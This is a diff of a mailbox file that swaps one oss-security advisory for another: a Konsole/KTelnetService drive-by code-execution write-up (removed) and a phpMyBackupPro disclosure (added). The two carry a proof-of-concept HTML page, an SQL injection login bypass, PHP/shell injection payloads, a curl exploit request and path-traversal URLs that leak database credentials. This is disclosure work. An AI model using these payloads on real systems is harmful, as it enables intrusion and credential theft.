@@ -1,4 +1,9 @@
-Received: (qmail 5663 invoked by uid 550); 10 Jun 2025 17:58:41 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7703" "Saturday" "25" "April" "2015" "12:04:05" "+1200" "Matthew Daley" "mattd@bugfuzz.com" "<CAD3Canczf0QMBQUJdP_BdbN0nFE-ZgzSwBGXyJJZ4qES=y5_cA@mail.gmail.com>" "193" "[oss-security] CVE requests / Advisory: phpMyBackupPro" nil nil nil "4" "2015042500:04:05" "[oss-security] CVE requests / Advisory: phpMyBackupPro" (number mark "        mattd@bugfuz Apr 25  193/7703  " thread-indent "\"[oss-security] CVE requests / Advisory: phpMyBackupPro\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 25604 invoked by uid 550); 25 Apr 2015 00:04:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,188 +11,221 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 15781 invoked from network); 10 Jun 2025 17:45:36 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=proofnet.de;
-	s=kas202502081007; t=1749577525;
-	bh=ooHPFSYaATEWSQnu3fXAPmNnGtOETjV8bnJUcVgTf3A=;
-	h=Date:From:To:Subject:From;
-	b=Lc7hYBp4jcitq4nZbIkGlcZAsTVlUp3A9Zo0VEIFKTqLJOUF+hUdBB1/wk2ICP/4W
-	 CUniSuarW8J+VAfevQYXmuQqVok5qyMmYze1wZzcVMDcInqf1GYVggjCf36Z9kieLq
-	 kYoFIulUBS1pumF/QjY+NGraaNj7uAvpEYF4ZoVX2n9Ncnpg/U60pEVuLo4MA+J8w9
-	 nnPJU6StTO8lxc4f3hSvBlJtlolE4F5+T2PGKOal0WgBDkFBwb67ahXBDQG0Zx+0C7
-	 VJMAFi9X8uJ9SQl6CoFdKqkIBcTpphQJ202Vhg2r+mbhDgcL8UqKvIXCuWbVQyLtmD
-	 35r+r834jdyCg==
-Date: Tue, 10 Jun 2025 19:45:24 +0200
-From: Dennis Dast <dennis.dast@proofnet.de>
-To: oss-security@lists.openwall.com
-Message-ID: <aEhvNIJLMqKGCYqY@proofnet>
+Received: (qmail 24562 invoked from network); 25 Apr 2015 00:04:16 -0000
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to:cc
+         :content-type;
+        bh=KjSF8XeZmVU82+/OFS3OMy5hZrrz5Be54rwUU8SmrnU=;
+        b=dHVRB+JUq5PU4hKA6WLe+RsOkto10IkXAJr90Zgnm4n0xp3kxw0RHaLBB0CByDTFOH
+         4c8ksrCdVXgRsIVbkDO8jc9SABzpPVjnUuY6JJrl1c5GwhWI+Ok8Prpvlu8wlrB4nhMb
+         DOZ5x8uya146dlO9Ngt/0bih28J70Wfdj88ALIpE+cbF0Y5hDVfH0yU4Jzyqh0iRJMwg
+         tn+WaLPb9adgtG0KpjCLLFI8+T5dNzEWkuBC9AN8dHot1yff0BYe0ItUlCZUcoNbsC6f
+         q1DN4Yaz4lMynBbZuXdBN2a2nfwV2QIoc0I9dFFINO9C9CrVWuQxY2Rt/LFDcAeR5afu
+         cnNQ==
+X-Gm-Message-State: ALoCoQksUwvY5rP2dq08DiH2cmDIMuwijZGtP8gw0NR7+FfzM1X5A3MhPrTk0vnc0vONW1N+FXV8
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-Subject: [oss-security] CVE-2025-49091: Konsole: Code execution from web browser using URL schemes
- handled by KDE's KTelnetService and Konsole < 25.04.2
+X-Received: by 10.194.223.66 with SMTP id qs2mr1654527wjc.6.1429920245353;
+ Fri, 24 Apr 2015 17:04:05 -0700 (PDT)
+Message-ID: <CAD3Canczf0QMBQUJdP_BdbN0nFE-ZgzSwBGXyJJZ4qES=y5_cA@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Cc: cve-assign@mitre.org
+Date: Sat, 25 Apr 2015 12:04:05 +1200
+From: Matthew Daley <mattd@bugfuzz.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE requests / Advisory: phpMyBackupPro
+To: oss-security@lists.openwall.com
 
-Code execution from web browser using URL schemes handled by KDE's KTelnetService and Konsole
-=============================================================================================
+I'd like to request CVE IDs for these issues in phpMyBackupPro. This
+is the first such request; this message serves as an advisory as well.
 
-Abstract
---------
+Unfortunately there does not appear to be a public repository to be
+able to link directly to code or fixes.
 
-This issue affects systems where KTelnetService and a vulnerable version
-of Konsole are installed but at least one of the programs telnet, rlogin
-or ssh is not installed.  The vulnerability is in KDE's terminal
-emulator Konsole [1].  As stated in the advisory by KDE [2], Konsole
-versions < 25.04.2 are vulnerable.
-
-On vulnerable systems remote code execution from a visited website is
-possible if the user allows loading of certain URL schemes (telnet://,
-rlogin:// or ssh://) in their web browser.  Depending on the web browser
-and configuration this, e.g., means accepting a prompt in the browser.
-
-CVE-2025-49091 was assigned for this issue.
-
-This finding was inspired by an article published in April 2025 about an
-arbitrary file read vulnerability in Yelp [3] that can be triggered from
-a website loaded in the browser if the user allows loading of a special
-URL (ghelp://).  By checking which other scheme handlers are installed
-on our Linux desktops we found this attack on KDE software.
-
-[1] https://invent.kde.org/utilities/konsole
-[2] https://kde.org/info/security/advisory-20250609-1.txt
-[3] https://blogs.gnome.org/mcatanzaro/2025/04/15/dangerous-arbitrary-file-read-vulnerability-in-yelp-cve-2025-3155/
+(Note: there are multiple reflected/stored XSS as well, but I didn't
+have the time to enumerate and report them all.)
 
 
-Description
------------
+--- Common information
 
-To reproduce the issue we need a system where KTelnetService and Konsole
-< 25.04.2 is installed but at least one of the programs telnet, rlogin
-or ssh is not installed.  When we found this issue (2025-04-16) this was
-the case in the default installation of Fedora KDE Plasma Desktop 42
-where both telnet and rlogin are missing and Konsole 24.12.3 was
-installed.
+* Affected software: phpMyBackupPro
+* Website: http://www.phpmybackuppro.net/
 
-To explain the issue we go through a proof of concept step by step.  For
-the first step load the following website in Firefox:
+* Changelog: File doc/HISTORY.txt in the release zip file states
+"03/26/2015: v.2.5:  security fixes in mutli user mode, minor bug
+fixes"
 
-    <html>
-    <head>
-        <script type="text/javascript">
-
-        function downloadAndRedirect() {
-            const anchor = document.createElement('a');
-            anchor.href = "data:;base64,ZWNobyAiSGVsbG8gd29ybGQiCnRvdWNoIC90bXAvZm9vYmFyCg==";
-            anchor.download = 'evil';
-            document.body.appendChild(anchor);
-            anchor.click();
-            document.body.removeChild(anchor);
-
-            setTimeout(() => {
-                window.location.href = "telnet:///proc/self/cwd/Downloads/evil";
-            }, 1000);
-        }
-        </script>
-    </head>
-    <body onload="downloadAndRedirect()">
-    </body>
-    </html>
-
-This will download a file to ~/Downloads/evil (the default configuration
-of Firefox will automatically store the file without asking the user)
-with the following content:
-
-    echo "Hello world"
-    touch /tmp/foobar
-
-After the download the website redirects to:
-
-    telnet:///proc/self/cwd/Downloads/evil
-
-KTelnetService has registered a telnet, rlogin and ssh scheme handler in
-/usr/share/applications/ktelnetservice6.desktop:
-
-    [Desktop Entry]
-    Type=Application
-    Exec=ktelnetservice6 %u
-    Icon=utilities-terminal
-    MimeType=x-scheme-handler/telnet;x-scheme-handler/rlogin;x-scheme-handler/ssh;
-
-    NoDisplay=true
-
-    Name=KTelnetService
-    [...]
-
-Therefore, Firefox will ask "Allow this site to open the telnet link
-with KTelnetService?".
-
-If the user clicks "Open Link", KTelnetService will run the following:
-
-    /usr/bin/konsole --noclose -e telnet /proc/self/cwd/Downloads/evil
-
-However, since telnet is not installed Konsole will instead fall back to
-executing "/bin/bash" but still with the argument
-"/proc/self/cwd/Downloads/evil".  This means the previously downloaded
-script is executed.  This can be seen in the opened Konsole window
-which shows:
-
-    Warning: Could not find 'telnet', starting '/bin/bash' instead.  Please check your profile settings.
-
-    Hello world
-
-As expected "/tmp/foobar" is created, showing that arbitrary code
-execution is possible.
+* Reported by: Matthew Daley
+* Timeline:
+2015-03-26: Private disclosure to vendor
+2015-03-27: Vendor response
+2015-03-31: v2.5 released
+2015-04-04: Private note to vendor that some issues (#2, #3, #4 below)
+remain unfixed
+2015-04-25: Public disclosure
 
 
-Fix in Konsole 25.04.2
-----------------------
+--- Issue #1: SQL injection in multi-user mode
 
-This was fixed in Konsole 25.04.2 by commit 09d20dea [4] which clears
-the arguments in case the command is not found by Konsole.  That means
-if telnet, rlogin or ssh is not found Konsole will no longer execute
-"/bin/bash /proc/self/cwd/Downloads/evil".  Instead the argument is
-cleared and only "/bin/bash" is executed.
+* Affected versions: ? -> 2.4
+* Fixed version: 2.5
+* Bug entry: https://sourceforge.net/p/phpmybackup/bugs/35/ (still private)
 
-[4] https://invent.kde.org/utilities/konsole/-/commit/09d20dea109050b4c02fb73095f327b5642a2b75
+* Description:
+In multi-user mode, the username and password given when a user logs
+in is not escaped before interpolation into the SQL query that is used
+to look up users in the database. Hence, it is vulnerable to a simple
+SQL injection attack.
+
+The injection occurs at line 70 of login.php:
+$res=mysql_query("select * from user where
+(User='".$_POST['username']."' or User='') and
+password=password('".$_POST['password']."')");
+
+The documentation given in documentation/MULTI_USER_MODE.txt states:
+> You will have to provide the MySQL root account data which are used by phpMyBackupPro to determine all available MySQL users.
+
+Hence, it's highly likely that unauthenticated attackers are able to
+enumerate all database entries and complete database configuration
+information, such as user password hashes, using this vulnerability. A
+tool such as sqlmap can be (and has been) used to do this.
+
+It's also possible to exploit this vulnerability in order to log in as
+any user given a victim's username. To do so, an attacker logs in with
+the victim's username and the string "') OR 1=1-- " as password.
+
+It's also possible to "log in" without a known username. To do so, an
+attacker logs in with a username such as "../../../../../../../../tmp"
+(which gets injected into the per-user configuration file path) and
+the password string given above. This allows phpMyBackupPro to create
+a multi-user config file in the /tmp directory regardless of how the
+per-user configuration file path been configured.
+
+In v2.5, this issue is fixed.
 
 
-Timeline
---------
+--- Issue #2: Arbitrary code execution through user configuration variables
 
-Reporting the issue to the KDE security team worked without any
-difficulty.
+* Affected versions: ? -> 2.5
+* Fixed version: none
+* Bug entry: https://sourceforge.net/p/phpmybackup/bugs/36/ (still private)
 
-2025-04-16: Issue reported to security@kde.org
-2025-04-16: Report acknowledged by the KDE security team
-2025-05-12: KDE security team confirmed the exploit and confirmed that fixes are in preparation
-2025-06-05: KDE security team informed us that the issue was fixed and will be made public
-2025-06-09: KDE Security Advisory was published (https://kde.org/info/security/advisory-20250609-1.txt)
-2025-06-10: Write-up was published (https://proofnet.de/publikationen/konsole_rce.html)
+* Description:
+It's possible, once logged in to phpMyBackupPro, to execute arbitrary
+PHP code. This is done by injecting it into a configuration variable
+using a PHP variable variable or by breaking out of the string literal
+in which the variable's value is stored in the user's configuration
+file.
+
+For example, setting a user's "delete local backups after x days"
+configuration variable to the following value causes the file /tmp/xyz
+to be created:
+${`touch /tmp/xyz`}
+
+The value is stored unchanged in the user's configuration file
+(phpMyBackupPro_conf.php) as follows:
+$CONF['del_time']=htmlspecialchars_decode("${`touch /tmp/xyz`}");
+
+As the value is not escaped before being interpolated into the
+configuration file's content, the embedded PHP code (in this case, a
+single backticked shell statement) will be executed when the
+configuration file is include_once'd. This includes the next loading
+of any phpMyBackupPro page by that user.
+
+(Note: Upon setting the value, the message "delete local backups after
+x days' is not correct!" will be displayed; however, the setting is
+still written to the user's configuration file.)
+
+In v2.5, it is no longer possible to use PHP variable variables to
+gain RCE in this way. However, it is still possible to break out of
+the configuration variable's value string literal and achieve RCE in
+other ways (e.g. \');`touch /tmp/xyz`;// ).
 
 
-Publication
------------
+--- Issue #3: Information disclosure through get_file.php functionality
 
-https://proofnet.de/publikationen/konsole_rce.html
+* Affected versions: ? -> 2.5
+* Fixed version: none
+* Bug entry: https://sourceforge.net/p/phpmybackup/bugs/37/ (still private)
 
--- 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* Description:
+It's possible, once logged in to phpMyBackupPro, to view (among other
+filetypes) the content of any .php file using the functionality
+provided by the get_file.php file. This includes the content of
+phpMyBackupPro's own configuration files, which contain sensitive
+information such as root database credentials.
 
-Dennis Dast
-Mail: dennis.dast@proofnet.de
+For example, after logging in, a request to get_file.php can be made
+to retrieve the content of definitions.php by using the following URL:
+http://[host]/phpMyBackupPro/get_file.php?view=definitions.php
 
-proofnet GmbH
-Embedded Security Services
-Otto-Lilienthal-Str. 36
-71034 Böblingen
+This will output the content of definitions.php, including the
+location of the global configuration file (as the value of the
+_PMBP_GLOBAL_CONF variable). Using this information, another request
+can be made, this time for this global configuration file:
+http://[host]/phpMyBackupPro/get_file.php?view=/[path]/global_conf.php
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This will disclose the content of the global configuration file,
+including root database credentials.
 
-Geschäftsführer: Susanne Goldammer, Roman Schmidt
-Sitz der Gesellschaft: Böblingen
-Registergericht: Amtsgericht Stuttgart HRB 751556
-Steuernummer: 56/464/03076
+In v2.5, it is no longer possible to disclose the content of
+phpMyBackupPro's configuration files by using get_file.php with a
+direct path reference to the configuration file in question. However,
+it is still possible by using indirect path references (e.g. replacing
+"../../files/global_conf.php" with
+"../../files/../files/global_conf.php").
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+--- Issue #4: Arbitrary code execution through scheduled backup scripts
+
+* Affected versions: ? -> 2.5
+* Fixed version: none
+* Bug entry: https://sourceforge.net/p/phpmybackup/bugs/38/ (still private)
+
+* Description:
+It's possible, once logged in to phpMyBackupPro, to execute arbitrary
+PHP code. This is done by injecting it into an automatically-generated
+scheduled backup script.
+
+Many of the user-specified parameters used when generating a scheduled
+backup script are not correctly escaped before being interpolated into
+the script; for example, the "period" parameter.
+
+This can be exploited by eg. using curl:
+curl -b 'PHPSESSID=[session cookie]' -d 'man_dirs=x&path=[writeable
+path]/&filename=rce.php&period=;echo+"<h1>RCE</h1>"'
+'http://[host]/phpMyBackupPro/scheduled.php'
+
+This will lead scheduled.php to create a scheduled backup script named
+"rce.php" in the attacker-specified writable path with the following
+content:
+<?php
+// This script was created by phpMyBackupPro v.2.4
+(http://www.phpMyBackupPro.net)
+// In order to work probably, it must be saved in the directory writable/.
+$_POST['man_dirs']="x";
+$period=(3600*24);echo "<h1>RCE</h1>";
+$security_key="d06378763f9369ceea61663c33e0e8ca";
+// switch to the phpMyBackupPro v.2.4 directory
+@chdir("/var/www");
+@include("backup.php");
+// switch back to the directory containing this script
+@chdir("writable/");
+?>
+
+Note that the "period" value is interpolated into the content without
+being escaped. The attacker can then execute the newly-created
+"rce.php", along with the injected PHP code, by making a normal HTTP
+request for the file.
+
+This obviously requires the attacker to know a web-accessible and
+web-writeable directory to pass in as the "path" parameter to
+scheduled.php.
+
+In v2.5, it is no longer possible to split the "period" PHP statement
+with a semicolon. However, it is possible to still inject code using
+many other methods (e.g. .print("RCE") ). There are also other
+injectable parameters, e.g. dirs[]=".print("RCE2")."' .
+
+
+- Matthew Daley
